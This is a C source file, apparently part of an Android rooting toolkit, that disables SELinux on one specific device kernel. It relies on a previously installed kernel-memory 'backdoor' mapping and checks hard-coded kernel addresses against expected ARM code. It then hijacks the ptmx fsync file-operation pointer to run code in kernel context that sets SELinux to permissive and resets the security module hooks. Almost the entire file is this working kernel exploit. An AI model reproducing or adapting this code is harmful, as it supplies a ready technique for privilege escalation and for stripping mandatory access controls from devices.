#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/system_properties.h>
#define _LARGEFILE64_SOURCE
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "ptmx.h"
#include "backdoor_mmap.h"

#define ARRAY_SIZE(x)  (sizeof (x) / sizeof ((x)[0]))

#define selinux_enforcing_address                 0xc115165c
#define selnl_notify_setenforce_address           0xc028a408
#define selinux_status_update_setenforce_address  0xc0296b78
#define reset_security_ops_address                0xc027ec94

static unsigned long int check_selinux_enforcing[] =
{
  0x00000001  //                                          ; enforcing mode
};

static unsigned long int check_selnl_notify_setenforce[] =
{
  0xe92d4007, //      STMPW   [SP], { R0-R2, LR }
  0xe28d1008, //      ADD     R1, SP, #$8
  0xe5210004, //      STR!    R0, [R1, -#$4]
  0xe3a00010, //      MOV     R0, #$10
  0xebffffbf, //      BL      $c028a31c                   ; selnl_notify
  0xe8bd800e, //      LDMUW   [SP], { R1-R3, PC }
};

static unsigned long int check_selinux_status_update_setenforce[] = {
  0xe92d4010, //      STMPW   [SP], { R4, LR }
  0xe1a04000, //      MOV     R4, R0
  0xe59f00bc, //      LDR     R0, =0xc0fa8db0 [$c0296c44] ; selinux_status_lock
  0xeb159af7, //      BL      $c07fd768
  0xe59f30b8, //      LDR     R3, =0xc11531e0 [$c0296c48] ; selinux_status_page
  0xe5930000, //      LDR     R0, [R3]
  0xe3500000, //      CMPS    R0, #$0
  0x0a000027, //      BEQ     $c0296c38
  0xebf9ed20, //      BL      $c0112020                   ; page_address
              //      ...
};

static unsigned long int check_reset_security_ops[] = {
  0xe59f2008, //      LDR     R2, =0xc0fa6804 [$c027eca4] ; default_security_ops
  0xe59f3008, //      LDR     R3, =0xc1150630 [$c027eca8] ; security_ops
  0xe5832000, //      STR     R2, [R3]
  0xe12fff1e, //      BX      LR
  0xc0fa6804, //                                          ; default_security_ops
  0xc1150630, //                                          ; security_ops
};

#define DEFINE_CHECK(name)  { name##_address, check_##name, sizeof(check_##name) }

struct check_code_t {
  unsigned long int addr;
  const unsigned long int *expected;
  size_t size;
};

static struct check_code_t check_code[] =
{
  DEFINE_CHECK(selinux_enforcing),
  DEFINE_CHECK(selnl_notify_setenforce),
  DEFINE_CHECK(selinux_status_update_setenforce),
  DEFINE_CHECK(reset_security_ops),
};

static bool
check_unlock_code(void)
{
  unsigned long int *p;
  int pos;
  bool ret = true;

  for (pos = 0; pos < ARRAY_SIZE(check_code); pos++) {
    p = backdoor_convert_to_mmaped_address((void *)check_code[pos].addr);

    if (memcmp(p, check_code[pos].expected, check_code[pos].size) != 0) {
      int i;

      printf("kernel code doesn't match at 0x%08x !!\n", check_code[pos].addr);
      for (i = 0; i < check_code[pos].size / sizeof (check_code[pos].expected[0]); i++) {
        printf("  0x%08x\n", p[i]);
      }

      printf("\n");

      ret = false;
    }
  }

  return ret;
}

static unsigned long int *selinux_enforcing = (unsigned long int *)0xc115165c;
static void (*selnl_notify_setenforce)(int) = (void *)0xc028a408;
static void (*selinux_status_update_setenforce)(int) = (void *)0xc0296b78;
static void (*reset_security_ops)(void) = (void *)0xc027ec94;

static void
selinux_set_permissive(void)
{
  *selinux_enforcing = 0;
  selnl_notify_setenforce(0);
  selinux_status_update_setenforce(0);
  reset_security_ops();
}

static bool
run_selinux_set_permissive(void)
{
  int fd;

  fd = open(PTMX_DEVICE, O_WRONLY);
  fsync(fd);
  close(fd);

  return true;
}

static bool
do_unlock(void)
{
  void **ptmx_fsync_address;
  unsigned long int ptmx_fops_address;
  bool ret = false;

  ptmx_fops_address = get_ptmx_fops_address();
  if (!ptmx_fops_address) {
    return false;
  }

  if (!backdoor_open_mmap()) {
    printf("Failed to mmap due to %s.\n", strerror(errno));
    printf("Run 'install_backdoor' first\n");

    return false;
  }

  if (check_unlock_code()) {
    ptmx_fsync_address = backdoor_convert_to_mmaped_address((void *)ptmx_fops_address + 0x38);
    *ptmx_fsync_address = selinux_set_permissive;

    ret = run_selinux_set_permissive();

    *ptmx_fsync_address = NULL;
  }

  backdoor_close_mmap();

  return ret;
}

int
main(int argc, char **argv)
{
  if (!do_unlock()) {
    printf("Failed to unlock LSM.\n");
    exit(EXIT_FAILURE);
  }

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
